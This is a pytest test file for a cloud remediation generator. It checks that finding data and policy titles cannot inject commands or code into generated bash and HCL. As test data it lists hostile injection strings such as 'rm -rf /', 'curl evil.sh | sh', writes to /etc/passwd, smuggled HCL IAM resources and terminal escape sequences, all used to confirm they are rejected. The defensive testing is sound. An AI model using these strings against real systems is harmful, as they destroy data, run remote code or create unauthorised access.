"""Tests for the core model: validation, safety tiering, and the guards.

These are the tests that matter most. The model is what stops untrusted finding
data from reaching generated infrastructure code, and it is what stops a recipe
author from mislabelling a dangerous change as safe.
"""

from __future__ import annotations

import pytest

from remgen.model import (
    MAX_TEXT_LENGTH,
    ApiCall,
    CostImpact,
    Effort,
    Finding,
    HclTarget,
    Policy,
    Recipe,
    SafetyTier,
    UnsafeIdentifierError,
    collapse_whitespace,
    to_hcl_label,
    validate_identifier,
)

# ---------------------------------------------------------------------------
# Identifier validation
# ---------------------------------------------------------------------------

#: Values that must never reach a generated artifact. Each is a real injection
#: shape for either bash or HCL.
UNSAFE_VALUES = [
    "bucket; rm -rf /",
    "bucket && curl evil.sh | sh",
    "$(whoami)",
    "`whoami`",
    "${HOME}",
    'bucket"\nresource "aws_iam_policy" "x" {',
    "bucket\nrm -rf /",
    "bucket\r\nmalicious",
    "bucket'--",
    'bucket"',
    "bucket\\escape",
    "bucket|tee /etc/passwd",
    "bucket>out",
    "bucket<in",
    "bucket*glob",
    "bucket?q",
    "bucket!bang",
    "bucket#comment",
    "bucket%s",
    "bucket\x00null",
    "bucket\ttab",
    "-leading-dash",
    "",
    "x" * 1025,
]


@pytest.mark.parametrize("value", UNSAFE_VALUES)
def test_unsafe_identifiers_are_rejected(value):
    with pytest.raises(UnsafeIdentifierError):
        validate_identifier(value, field_name="resource_id")


@pytest.mark.parametrize(
    "value",
    [
        "my-bucket",
        "my.bucket.example",
        "MyTable_1",
        "arn:aws:cloudtrail:us-east-1:123456789012:trail/my-trail",
        "1234abcd-12ab-34cd-56ef-1234567890ab",
        "key/with/slashes",
        "tag=value",
        "user+plus@example.com",
        "name with spaces",
        "x" * 1024,
    ],
)
def test_legitimate_aws_identifiers_are_accepted(value):
    assert validate_identifier(value, field_name="resource_id") == value


def test_validate_identifier_rejects_non_strings():
    for value in (None, 123, [], {}):
        with pytest.raises(UnsafeIdentifierError):
            validate_identifier(value, field_name="resource_id")


def test_finding_validates_every_field():
    with pytest.raises(UnsafeIdentifierError):
        Finding(policy_id="p", resource_id="ok", region="us-east-1; evil", account_id="1")
    with pytest.raises(UnsafeIdentifierError):
        Finding(policy_id="p", resource_id="ok", region="us-east-1", account_id="$(x)")
    with pytest.raises(UnsafeIdentifierError):
        Finding(
            policy_id="p",
            resource_id="ok",
            region="us-east-1",
            account_id="1",
            resource_name="bad`name`",
        )


# ---------------------------------------------------------------------------
# HCL labels
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("my-bucket", "my-bucket"),
        ("my.bucket", "my_bucket"),
        ("arn:aws:s3:::bucket/key", "arn_aws_s3_bucket_key"),
        ("123table", "r_123table"),
        ("UPPER", "upper"),
        ("a..b", "a_b"),
        ("...", "resource"),
    ],
)
def test_to_hcl_label(value, expected):
    assert to_hcl_label(value) == expected


def test_hcl_labels_are_valid_hcl_identifiers():
    import re

    for value in ("arn:aws:s3:::b/k", "1x", "a.b.c", "UPPER-case"):
        label = to_hcl_label(value)
        assert re.fullmatch(r"[A-Za-z_][A-Za-z0-9_-]*", label), label


# ---------------------------------------------------------------------------
# Free-form text sanitisation
# ---------------------------------------------------------------------------


def test_collapse_whitespace_strips_newlines():
    # A newline in a policy title would escape the comment it is rendered in.
    assert collapse_whitespace("a\nb") == "a b"
    assert collapse_whitespace("a\r\n\tb  c") == "a b c"
    assert collapse_whitespace("  padded  ") == "padded"


def test_policy_title_is_sanitised():
    policy = Policy(policy_id="p", title="Bad\ntitle", category="C\nat")
    assert "\n" not in policy.title
    assert "\n" not in policy.category


def test_collapse_whitespace_strips_control_characters():
    # An ANSI escape in a title can rewrite the terminal, so the reader cannot
    # trust what they are shown.
    out = collapse_whitespace("Bad\x1b[31mred\x00\x07")
    assert "\x1b" not in out
    assert "\x00" not in out
    assert "\x07" not in out
    assert "31mred" in out  # the text survives; only the escape byte is dropped


def test_collapse_whitespace_bounds_length():
    # An unbounded title floods the terminal and every generated comment.
    out = collapse_whitespace("A" * 5000)
    assert len(out) == MAX_TEXT_LENGTH
    assert out.endswith("...")


def test_collapse_whitespace_leaves_normal_text_intact():
    # The cap must not truncate a realistic title.
    title = "Ensure S3 buckets have versioning enabled (CIS AWS Foundations 2.1.3)"
    assert collapse_whitespace(title) == title


def test_policy_title_is_bounded():
    policy = Policy(policy_id="p", title="T" * 5000, category="C" * 5000)
    assert len(policy.title) <= MAX_TEXT_LENGTH
    assert len(policy.category) <= MAX_TEXT_LENGTH


@pytest.mark.parametrize(
    "title",
    [
        "Bad\n\naws iam create-user --user-name pwned\n#",
        "Bad\r\nrm -rf /",
        'Bad*/\n} resource "aws_iam_user" "pwned" {\n  name = "x"\n}\n#',
        "Bad\x1b[2J\x1b[H cleared your screen",
        "Bad\x00\x07bell",
    ],
)
def test_policy_title_cannot_escape_a_single_line(title):
    # The property that matters: whatever the catalog contains, a title occupies
    # exactly one line and carries no terminal control sequences. Anything else
    # lets catalog text escape the comment it is rendered inside.
    policy = Policy(policy_id="p", title=title)
    assert "\n" not in policy.title
    assert "\r" not in policy.title
    assert not any(ord(ch) < 32 for ch in policy.title)


def test_policy_requires_id():
    with pytest.raises(ValueError, match="policy_id"):
        Policy(policy_id="", title="x")


# ---------------------------------------------------------------------------
# Recipe invariants
# ---------------------------------------------------------------------------


def _api() -> ApiCall:
    return ApiCall(service="s3", operation="PutBucketVersioning", parameters=("Bucket",))


def _recipe(**overrides) -> Recipe:
    kwargs = {
        "policy_id": "p1",
        "policy_title": "Title",
        "summary": "Summary",
        "api": _api(),
        "cli_template": "aws s3api do-thing --bucket {resource_id}",
        "hcl": None,
        "reverse_hint": "undo it",
    }
    kwargs.update(overrides)
    return Recipe(**kwargs)


def test_recipe_requires_resource_id_in_template():
    # A command without {resource_id} would target the wrong thing, or everything.
    with pytest.raises(ValueError, match="resource_id"):
        _recipe(cli_template="aws s3api do-thing --bucket hardcoded")


def test_recipe_requires_policy_id():
    with pytest.raises(ValueError, match="policy_id"):
        _recipe(policy_id="")


def test_reversible_recipe_must_explain_how_to_reverse():
    with pytest.raises(ValueError, match="reverse_hint"):
        _recipe(reversible=True, reverse_hint="")


def test_api_call_requires_parameters():
    with pytest.raises(ValueError, match="parameters"):
        ApiCall(service="s3", operation="Op", parameters=())
    with pytest.raises(ValueError, match="service and operation"):
        ApiCall(service="", operation="Op", parameters=("A",))


# ---------------------------------------------------------------------------
# Safety tiering -- derived, so it cannot be mislabelled
# ---------------------------------------------------------------------------


def test_safest_requires_all_safe_properties():
    assert _recipe().safety_tier is SafetyTier.SAFEST


@pytest.mark.parametrize(
    "overrides",
    [
        {"reversible": False, "reverse_hint": ""},
        {"cost_impact": CostImpact.USAGE_SCALED},
        {"blocks_iac_destroy": True},
    ],
)
def test_commitment_downgrades_to_caution(overrides):
    assert _recipe(**overrides).safety_tier is SafetyTier.CAUTION


@pytest.mark.parametrize(
    "overrides",
    [
        {"data_path_impact": True},
        {"effort": Effort.MEDIUM},
        {"effort": Effort.REPLACEMENT},
    ],
)
def test_availability_risk_downgrades_to_disruptive(overrides):
    assert _recipe(**overrides).safety_tier is SafetyTier.DISRUPTIVE


def test_disruptive_wins_over_caution():
    # Worst property must dominate; a dangerous change must not be softened by
    # also being reversible.
    recipe = _recipe(data_path_impact=True, blocks_iac_destroy=True)
    assert recipe.safety_tier is SafetyTier.DISRUPTIVE


def test_safety_notes_describe_each_risk():
    recipe = _recipe(
        reversible=False,
        reverse_hint="",
        data_path_impact=True,
        cost_impact=CostImpact.USAGE_SCALED,
        blocks_iac_destroy=True,
        effort=Effort.REPLACEMENT,
    )
    joined = " ".join(recipe.safety_notes)
    assert "NOT REVERSIBLE" in joined
    assert "AFFECTS LIVE TRAFFIC" in joined
    assert "COST SCALES WITH USAGE" in joined
    assert "destroy" in joined
    assert "REPLACEMENT" in joined


def test_reversible_recipe_notes_how_to_reverse():
    assert any("undo it" in n for n in _recipe().safety_notes)


# ---------------------------------------------------------------------------
# HclTarget guards
# ---------------------------------------------------------------------------


def test_hcl_attribute_rejects_literal_braces():
    # Literal braces would be parsed as str.format placeholders at render time.
    with pytest.raises(ValueError, match="braces"):
        HclTarget(
            resource_type="aws_thing",
            attributes=(("block", '{ status = "Enabled" }'),),
            import_id_template="{resource_id}",
        )


def test_hcl_attribute_allows_known_placeholders():
    target = HclTarget(
        resource_type="aws_thing",
        attributes=(("bucket", '"{resource_id}"'), ("region", '"{region}"')),
        import_id_template="{resource_id}",
    )
    assert target.is_complete


def test_is_complete_reflects_unresolvable_requirements():
    with_attr = HclTarget(
        resource_type="aws_thing",
        attributes=(),
        import_id_template="{resource_id}",
        unresolvable_required_attributes=(("engine", '"postgres"', "TODO: set it"),),
    )
    assert not with_attr.is_complete
    assert with_attr.unresolvable_names == ("engine",)

    with_block = HclTarget(
        resource_type="aws_thing",
        attributes=(),
        import_id_template="{resource_id}",
        unresolvable_required_blocks=("attribute",),
    )
    assert not with_block.is_complete
    assert with_block.unresolvable_names == ("attribute",)
